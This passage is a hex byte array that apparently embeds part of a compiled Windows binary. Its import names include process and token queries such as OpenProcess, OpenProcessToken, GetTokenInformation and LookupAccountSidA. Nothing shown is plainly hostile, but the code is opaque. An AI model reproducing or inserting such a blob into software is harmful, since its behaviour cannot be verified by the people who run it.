0x00, 0x00,	0xD3, 0x3E, 0x00, 0x00, 0xDF, 0x3E, 0x00, 0x00, 0x43, 0x4E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x09, 0x1A, 0x06, 0x00, 0x1A, 0x34, 0x0F, 0x00,	0x1A, 0x72, 0x16, 0xE0, 0x14, 0x70, 0x13, 0x60, 0x2C, 0x4A, 0x00, 0x00,	0x01, 0x00, 0x00, 0x00, 0x15, 0x3F, 0x00, 0x00, 0xFB, 0x3F, 0x00, 0x00,	0x57, 0x4E, 0x00, 0x00, 0xFB, 0x3F, 0x00, 0x00, 0x01, 0x06, 0x02, 0x00,	0x06, 0x52, 0x02, 0x50, 0x01, 0x0F, 0x06, 0x00, 0x0F, 0x64, 0x07, 0x00,	0x0F, 0x34, 0x06, 0x00, 0x0F, 0x32, 0x0B, 0x70, 0x09, 0x04, 0x01, 0x00,	0x04, 0x22, 0x00, 0x00, 0x2C, 0x4A, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,	0x9F, 0x42, 0x00, 0x00, 0x29, 0x43, 0x00, 0x00, 0x8D, 0x4E, 0x00, 0x00,	0x29, 0x43, 0x00, 0x00, 0x01, 0x02, 0x01, 0x00, 0x02, 0x50, 0x00, 0x00,	0x01, 0x14, 0x08, 0x00, 0x14, 0x64, 0x08, 0x00, 0x14, 0x54, 0x07, 0x00,	0x14, 0x34, 0x06, 0x00, 0x14, 0x32, 0x10, 0x70, 0x01, 0x09, 0x01, 0x00,	0x09, 0x62, 0x00, 0x00, 0x01, 0x08, 0x04, 0x00, 0x08, 0x72, 0x04, 0x70,	0x03, 0x60, 0x02, 0x30, 0x01, 0x0D, 0x04, 0x00, 0x0D, 0x34, 0x09, 0x00,	0x0D, 0x32, 0x06, 0x50, 0x01, 0x15, 0x05, 0x00, 0x15, 0x34, 0xBA, 0x00,	0x15, 0x01, 0xB8, 0x00, 0x06, 0x50, 0x00, 0x00, 0x01, 0x0F, 0x06, 0x00,	0x0F, 0x64, 0x06, 0x00, 0x0F, 0x34, 0x05, 0x00, 0x0F, 0x12, 0x0B, 0x70,	0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,	0x01, 0x02, 0x01, 0x00, 0x02, 0x30, 0x00, 0x00, 0x01, 0x19, 0x0A, 0x00,	0x19, 0x74, 0x09, 0x00, 0x19, 0x64, 0x08, 0x00, 0x19, 0x54, 0x07, 0x00,	0x19, 0x34, 0x06, 0x00, 0x19, 0x32, 0x15, 0xE0, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x30, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xF0, 0x68, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,	0xB0, 0x69, 0x00, 0x00, 0x88, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00,	0x20, 0x69, 0x00, 0x00, 0x88, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x58, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,	0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0x90, 0x12, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x30, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x08, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00,	0xD8, 0x69, 0x00, 0x00, 0xB0, 0x69, 0x00, 0x00, 0x88, 0x69, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x80, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,	0x18, 0x00, 0x00, 0x00, 0x80, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00,	0xA8, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF,	0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00, 0xE0, 0x11, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xD0, 0x80, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00, 0x18, 0x00, 0x00, 0x00,	0xA0, 0x11, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x30, 0x11, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x68, 0x69, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x18, 0x6B, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xAC, 0x6E, 0x00, 0x00,	0x20, 0x50, 0x00, 0x00, 0xF8, 0x6A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xF8, 0x6E, 0x00, 0x00, 0x00, 0x50, 0x00, 0x00,	0xB0, 0x6B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x54, 0x76, 0x00, 0x00, 0xB8, 0x50, 0x00, 0x00, 0x00, 0x6D, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x77, 0x00, 0x00,	0x08, 0x52, 0x00, 0x00, 0xB0, 0x6C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x28, 0x77, 0x00, 0x00, 0xB8, 0x51, 0x00, 0x00,	0xA8, 0x6D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x38, 0x79, 0x00, 0x00, 0xB0, 0x52, 0x00, 0x00, 0x48, 0x6D, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x58, 0x79, 0x00, 0x00,	0x50, 0x52, 0x00, 0x00, 0x10, 0x6D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x7A, 0x79, 0x00, 0x00, 0x18, 0x52, 0x00, 0x00,	0x20, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xA0, 0x79, 0x00, 0x00, 0x28, 0x53, 0x00, 0x00, 0x28, 0x6D, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC2, 0x79, 0x00, 0x00,	0x30, 0x52, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xCE, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x6E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xE4, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x74, 0x6E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xF6, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x64, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46, 0x6E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x96, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x82, 0x6E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x38, 0x6E, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x10, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x24, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x7A, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x5E, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x72, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8E, 0x7A, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xA8, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xBE, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD8, 0x7A, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xEE, 0x7A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xE2, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x26, 0x71, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x72, 0x71, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xB4, 0x71, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x3C, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x7C, 0x72, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xBA, 0x72, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x0E, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xDE, 0x70, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x62, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xA6, 0x73, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE6, 0x73, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x1C, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x88, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC4, 0x74, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x0A, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x52, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x9A, 0x75, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xD0, 0x75, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x0A, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x36, 0x76, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x06, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x28, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x44, 0x6F, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x5E, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x92, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBA, 0x6F, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xEC, 0x6F, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x0E, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x70, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x90, 0x70, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xEA, 0x76, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xD4, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x0A, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x76, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x8A, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x78, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x7B, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xBC, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x02, 0x7B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x62, 0x76, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFC, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xEC, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x56, 0x78, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x30, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x4A, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x7A, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x8C, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA6, 0x78, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xC8, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x6C, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x79, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x18, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x26, 0x79, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x78, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x66, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xE4, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x28, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x4C, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE4, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xDA, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xD0, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC4, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0xBA, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0xB0, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA6, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x9C, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x94, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x8C, 0x77, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x0A, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x3A, 0x77, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x32, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x3E, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,	0x00, 0x00, 0x00, 0x00, 0x10, 0x04, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72,	0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x49, 0x04, 0x51, 0x75, 0x65, 0x72,	0x79, 0x46, 0x75, 0x6C, 0x6C, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73,	0x49, 0x6D, 0x61, 0x67, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x41, 0x00, 0x00,	0x67, 0x02, 0x47, 0x65, 0x74, 0x4C, 0x61, 0x73, 0x74, 0x45, 0x72, 0x72,	0x6F, 0x72, 0x00, 0x00, 0x86, 0x00, 0x43, 0x6C, 0x6F, 0x73, 0x65, 0x48,	0x61, 0x6E, 0x64, 0x6C, 0x65, 0x00, 0x1D, 0x02, 0x47, 0x65, 0x74, 0x43,	0x75, 0x72, 0x72, 0x65, 0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73,	0x73, 0x00, 0x1E, 0x02, 0x47, 0x65, 0x74, 0x43, 0x75, 0x72, 0x72, 0x65,	0x6E, 0x74, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x49, 0x64, 0x00,	0x4B, 0x45, 0x52, 0x4E, 0x45, 0x4C, 0x33, 0x32, 0x2E, 0x64, 0x6C, 0x6C,	0x00, 0x00, 0x15, 0x02, 0x4F, 0x70, 0x65, 0x6E, 0x50, 0x72, 0x6F, 0x63,	0x65, 0x73, 0x73, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x00, 0x00, 0x70, 0x01,	0x47, 0x65, 0x74, 0x54, 0x6F, 0x6B, 0x65, 0x6E, 0x49, 0x6E, 0x66, 0x6F,	0x72, 0x6D, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0xA8, 0x01, 0x4C, 0x6F,	0x6F, 0x6B, 0x75, 0x70, 0x41, 0x63, 0x63, 0x6F, 0x75, 0x6E, 0x74, 0x53,	0x69, 0x64, 0x41, 0x00, 0x41, 0x44, 0x56, 0x41, 0x50, 0x49, 0x33, 0x32,	0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x00, 0x8E, 0x02, 0x3F, 0x5F, 0x58, 0x6C,	0x65, 0x6E, 0x67, 0x74, 0x68, 0x5F, 0x65, 0x72, 0x72, 0x6F, 0x72, 0x40,	0x73, 0x74, 0x64, 0x40, 0x40, 0x59, 0x41, 0x58, 0x50, 0x45, 0x42, 0x44,	0x40, 0x5A, 0x00, 0x00, 0x6D, 0x00, 0x3F, 0x3F, 0x30, 0x5F, 0x4C, 0x6F,	0x63, 0x6B, 0x69, 0x74, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x51, 0x45,	0x41, 0x41, 0x40, 0x48, 0x40, 0x5A, 0x00, 0x00, 0xA5, 0x00, 0x3F, 0x3F,	0x31, 0x5F, 0x4C, 0x6F, 0x63, 0x6B, 0x69, 0x74, 0x40, 0x73, 0x74, 0x64,	0x40, 0x40, 0x51, 0x45, 0x41, 0x41, 0x40, 0x58, 0x5A, 0x00, 0xD5, 0x01,	0x3F, 0x5F, 0x47, 0x65, 0x74, 0x67, 0x6C, 0x6F, 0x62, 0x61, 0x6C, 0x6C,	0x6F, 0x63, 0x61, 0x6C, 0x65, 0x40, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x65,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x43, 0x41, 0x50, 0x45, 0x41, 0x56,	0x5F, 0x4C, 0x6F, 0x63, 0x69, 0x6D, 0x70, 0x40, 0x31, 0x32, 0x40, 0x58,	0x5A, 0x00, 0xAB, 0x01, 0x3F, 0x5F, 0x46, 0x69, 0x6F, 0x70, 0x65, 0x6E,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x59, 0x41, 0x50, 0x45, 0x41, 0x55,	0x5F, 0x69, 0x6F, 0x62, 0x75, 0x66, 0x40, 0x40, 0x50, 0x45, 0x42, 0x44,	0x48, 0x48, 0x40, 0x5A, 0x00, 0x00, 0xC9, 0x03, 0x3F, 0x69, 0x64, 0x40,	0x3F, 0x24, 0x63, 0x6F, 0x64, 0x65, 0x63, 0x76, 0x74, 0x40, 0x44, 0x44,	0x55, 0x5F, 0x4D, 0x62, 0x73, 0x74, 0x61, 0x74, 0x65, 0x74, 0x40, 0x40,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x32, 0x56, 0x30, 0x6C, 0x6F, 0x63,	0x61, 0x6C, 0x65, 0x40, 0x32, 0x40, 0x41, 0x00, 0x1E, 0x05, 0x3F, 0x75,	0x6E, 0x63, 0x61, 0x75, 0x67, 0x68, 0x74, 0x5F, 0x65, 0x78, 0x63, 0x65,	0x70, 0x74, 0x69, 0x6F, 0x6E, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x59,	0x41, 0x5F, 0x4E, 0x58, 0x5A, 0x00, 0x44, 0x02, 0x3F, 0x5F, 0x4F, 0x73,	0x66, 0x78, 0x40, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x6F,	0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63,	0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40,	0x51, 0x45, 0x41, 0x41, 0x58, 0x58, 0x5A, 0x00, 0x68, 0x03, 0x3F, 0x66,	0x6C, 0x75, 0x73, 0x68, 0x40, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63,	0x5F, 0x6F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x40, 0x44, 0x55, 0x3F,	0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x69, 0x74, 0x73,	0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40, 0x73, 0x74, 0x64,	0x40, 0x40, 0x51, 0x45, 0x41, 0x41, 0x41, 0x45, 0x41, 0x56, 0x31, 0x32,	0x40, 0x58, 0x5A, 0x00, 0xB1, 0x01, 0x3F, 0x5F, 0x47, 0x65, 0x74, 0x63,	0x61, 0x74, 0x40, 0x3F, 0x24, 0x63, 0x6F, 0x64, 0x65, 0x63, 0x76, 0x74,	0x40, 0x44, 0x44, 0x55, 0x5F, 0x4D, 0x62, 0x73, 0x74, 0x61, 0x74, 0x65,	0x74, 0x40, 0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x53, 0x41, 0x5F,	0x4B, 0x50, 0x45, 0x41, 0x50, 0x45, 0x42, 0x56, 0x66, 0x61, 0x63, 0x65,	0x74, 0x40, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x65, 0x40, 0x32, 0x40, 0x50,	0x45, 0x42, 0x56, 0x34, 0x32, 0x40, 0x40, 0x5A, 0x00, 0x00, 0xE1, 0x04,	0x3F, 0x73, 0x70, 0x75, 0x74, 0x6E, 0x40, 0x3F, 0x24, 0x62, 0x61, 0x73,	0x69, 0x63, 0x5F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x62, 0x75, 0x66,	0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72,	0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x51, 0x45, 0x41, 0x41, 0x5F, 0x4A,	0x50, 0x45, 0x42, 0x44, 0x5F, 0x4A, 0x40, 0x5A, 0x00, 0x00, 0xC0, 0x03,	0x3F, 0x67, 0x65, 0x74, 0x6C, 0x6F, 0x63, 0x40, 0x3F, 0x24, 0x62, 0x61,	0x73, 0x69, 0x63, 0x5F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x62, 0x75,	0x66, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74,	0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40,	0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x51, 0x45, 0x42, 0x41, 0x3F,	0x41, 0x56, 0x6C, 0x6F, 0x63, 0x61, 0x6C, 0x65, 0x40, 0x32, 0x40, 0x58,	0x5A, 0x00, 0xDE, 0x04, 0x3F, 0x73, 0x70, 0x75, 0x74, 0x63, 0x40, 0x3F,	0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x73, 0x74, 0x72, 0x65, 0x61,	0x6D, 0x62, 0x75, 0x66, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61,	0x72, 0x5F, 0x74, 0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73,	0x74, 0x64, 0x40, 0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x51, 0x45,	0x41, 0x41, 0x48, 0x44, 0x40, 0x5A, 0x00, 0x00, 0x27, 0x05, 0x3F, 0x75,	0x6E, 0x73, 0x68, 0x69, 0x66, 0x74, 0x40, 0x3F, 0x24, 0x63, 0x6F, 0x64,	0x65, 0x63, 0x76, 0x74, 0x40, 0x44, 0x44, 0x55, 0x5F, 0x4D, 0x62, 0x73,	0x74, 0x61, 0x74, 0x65, 0x74, 0x40, 0x40, 0x40, 0x73, 0x74, 0x64, 0x40,	0x40, 0x51, 0x45, 0x42, 0x41, 0x48, 0x41, 0x45, 0x41, 0x55, 0x5F, 0x4D,	0x62, 0x73, 0x74, 0x61, 0x74, 0x65, 0x74, 0x40, 0x40, 0x50, 0x45, 0x41,	0x44, 0x31, 0x41, 0x45, 0x41, 0x50, 0x45, 0x41, 0x44, 0x40, 0x5A, 0x00,	0x2F, 0x00, 0x3F, 0x3F, 0x30, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63,	0x5F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x62, 0x75, 0x66, 0x40, 0x44,	0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72, 0x61, 0x69,	0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x40, 0x73,	0x74, 0x64, 0x40, 0x40, 0x49, 0x45, 0x41, 0x41, 0x40, 0x58, 0x5A, 0x00,	0xF5, 0x01, 0x3F, 0x5F, 0x49, 0x6E, 0x69, 0x74, 0x40, 0x3F, 0x24, 0x62,	0x61, 0x73, 0x69, 0x63, 0x5F, 0x73, 0x74, 0x72, 0x65, 0x61, 0x6D, 0x62,	0x75, 0x66, 0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F,	0x74, 0x72, 0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64,	0x40, 0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x49, 0x45, 0x41, 0x41,	0x58, 0x58, 0x5A, 0x00, 0xA6, 0x02, 0x3F, 0x63, 0x6C, 0x65, 0x61, 0x72,	0x40, 0x3F, 0x24, 0x62, 0x61, 0x73, 0x69, 0x63, 0x5F, 0x69, 0x6F, 0x73,	0x40, 0x44, 0x55, 0x3F, 0x24, 0x63, 0x68, 0x61, 0x72, 0x5F, 0x74, 0x72,	0x61, 0x69, 0x74, 0x73, 0x40, 0x44, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x51, 0x45, 0x41, 0x41, 0x58, 0x48,	0x5F, 0x4E, 0x40, 0x5A, 0x00, 0x00, 0xFA, 0x03, 0x3F, 0x69, 0x6E, 0x40,	0x3F, 0x24, 0x63, 0x6F, 0x64, 0x65, 0x63, 0x76, 0x74, 0x40, 0x44, 0x44,	0x55, 0x5F, 0x4D, 0x62, 0x73, 0x74, 0x61, 0x74, 0x65, 0x74, 0x40, 0x40,	0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x51, 0x45, 0x42, 0x41, 0x48, 0x41,	0x45, 0x41, 0x55, 0x5F, 0x4D, 0x62, 0x73, 0x74, 0x61, 0x74, 0x65, 0x74,	0x40, 0x40, 0x50, 0x45, 0x42, 0x44, 0x31, 0x41, 0x45, 0x41, 0x50, 0x45,	0x42, 0x44, 0x50, 0x45, 0x41, 0x44, 0x33, 0x41, 0x45, 0x41, 0x50, 0x45,	0x41, 0x44, 0x40, 0x5A, 0x00, 0x00, 0x33, 0x04, 0x3F, 0x6F, 0x75, 0x74,	0x40, 0x3F, 0x24, 0x63, 0x6F, 0x64, 0x65, 0x63, 0x76, 0x74, 0x40, 0x44,	0x44, 0x55, 0x5F, 0x4D, 0x62, 0x73, 0x74, 0x61, 0x74, 0x65, 0x74, 0x40,	0x40, 0x40, 0x73, 0x74, 0x64, 0x40, 0x40, 0x51, 0x45, 0x42, 0x41, 